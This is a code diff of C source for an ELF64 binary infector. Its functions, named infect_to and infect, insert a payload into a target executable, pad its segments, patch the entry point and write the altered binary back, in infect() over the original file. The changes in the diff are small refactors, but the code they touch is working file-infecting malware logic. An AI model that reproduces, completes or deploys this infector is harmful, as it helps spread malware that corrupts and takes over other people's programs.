@@ -13,7 +13,7 @@ static void _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
         return TRUE;
 }
 
-static void _insert_bzero(char **s, size_t *n, size_t pos, size_t add){
+static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
         char *ns = (char *)malloc((*n) + add);
         size_t i,j,l;
         for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
@@ -28,10 +28,9 @@ void update(char *b, size_t n, size_t old_entry, size_t entry){
 	//add a few information about himself
     Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
-	int DATA = 0x1b;
-	int JMP = 0x51;
+	int DATA = 0x19;
 	//modifying 2bit after
-	((size_t*)((char*)(b + pos + DATA)))[0] = max(old_entry,entry+JMP) - min(old_entry,entry+JMP);
+	((size_t*)((char*)(b + pos + DATA)))[0] = max(old_entry,entry) - min(old_entry,entry);
 	((size_t*)((char*)(b + pos + DATA)))[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
 	((size_t*)((char*)(b + pos + DATA)))[2] = n;
@@ -47,7 +46,7 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
     size_t diff = ph[x].p_memsz - ph[x].p_filesz;
     if (diff > 0){
     	//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
-		_insert_bzero(s,n, ph[x].p_offset+ph[x].p_filesz, diff);
+		_insert_zeros(s,n, ph[x].p_offset+ph[x].p_filesz, diff);
 		//reset it
 	    Elf64_Ehdr *h = (void*)*s;
 		ph = (*(void**)s) + h->e_phoff;
@@ -70,7 +69,7 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
 	return pos;
 }
 
-void infect_to(char *fname, char *to, char *b, size_t bn){
+int infect_to(char *fname, char *to, char *b, size_t bn){
 	//if (isFile(fname) == FALSE) return fail("not file");
 	//if (isElf64(fname) == FALSE) return fail("not elf64 binary");
 	char *s; size_t n;
@@ -81,7 +80,9 @@ void infect_to(char *fname, char *to, char *b, size_t bn){
 	//printf("INSERT NOW!\n");
 	println("INSERT in");
 	fput(to, s, n);
+	return TRUE;
 }
+
 void infect(char *fname, char *b, size_t bn){
 	infect_to(fname, fname, b, bn);
 }
